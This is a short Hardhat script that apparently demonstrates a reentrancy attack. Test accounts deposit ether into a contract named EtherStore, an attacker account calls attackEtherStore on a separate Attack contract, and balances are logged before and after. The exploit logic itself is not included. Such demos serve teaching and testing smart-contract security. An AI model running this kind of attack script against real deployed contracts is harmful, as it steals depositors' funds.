import { ethers } from "hardhat";

async function main() {
  const [deployer, hogu, killer] = await ethers.getSigners();
  console.log("Deploying contracts with the account:", deployer.address);
  console.log(
    "Account balance:",
    ethers.utils.formatEther(await deployer.getBalance()),
    "ETH"
  );

  // We get the contract to deploy
  const etherStoreCA = "0xCC05e1c8AF1A02502dea8dB4a94BAAf1e14A593f";
  const EtherStore = await ethers.getContractFactory("EtherStore");
  const etherStore = await EtherStore.attach(etherStoreCA);

  const attackCA = "0xC89974122d287A79532eAC1Dcc518d58DcCE9B0F";
  const Attack = await ethers.getContractFactory("Attack");
  const attacker = await Attack.attach(attackCA);

  for (let idx = 0; idx < 2; idx++) {
    console.log(
      "Balance of hogu is ",
      ethers.utils.formatEther(await hogu.getBalance()),
      "ETH"
    );
    const txs = [];
    const tx = await etherStore
      .connect(hogu)
      .depositFunds({ value: ethers.utils.parseUnits("0.01", "ether") });
    txs.push(tx);
    console.log("hogu deposited 0.01 ether to Bank");
    console.log(
      "Balance of hogu is ",
      ethers.utils.formatEther(await hogu.getBalance()),
      "ETH"
    );
  }

  console.log(
    "Balance of killer is ",
    ethers.utils.formatEther(await killer.getBalance()),
    "ETH"
  );
  const tx = await attacker.connect(killer).attackEtherStore({
    value: ethers.utils.parseUnits("0.01", "ether"),
    gasLimit: 5000000,
  });
  const receipt = await tx.wait();
  console.log(receipt);
  console.log(
    "Balance of killer is ",
    ethers.utils.formatEther(await killer.getBalance()),
    "ETH"
  );
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
